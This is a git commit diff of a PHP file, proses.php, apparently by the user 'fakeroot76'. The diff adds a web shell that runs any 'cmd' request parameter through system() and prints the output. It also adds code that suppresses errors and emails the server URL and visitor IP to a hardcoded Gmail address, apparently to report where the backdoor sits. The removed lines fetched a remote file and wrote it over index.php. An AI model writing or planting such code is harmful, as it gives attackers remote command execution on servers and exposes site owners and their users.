bcdf341f1861d3ed5b77ef37e561c2abb293fc52
fakeroot76 <71298901+fakeroot76@users.noreply.github.com>
2021-02-07 11:07:32 +0700

    Update proses.php

--- proses.php
+++ proses.php
@@ -34,9 +34,16 @@ $sha1     = sha1(gmdate("r"));
 '<script>window.location.replace("https://fake-root.blogspot.com")</script>';}
 }
 ?>
+
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 <?php
-$nama= fopen("index.php" ,"w+");
-  $file = file_get_contents('https://raw.githubusercontent.com/fakeroot76/fake/master/wp-config.php');
-  $tulis = fwrite ($nama ,$file);
- fclose($nama);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'fikriofficial4676@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "ACCESS", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
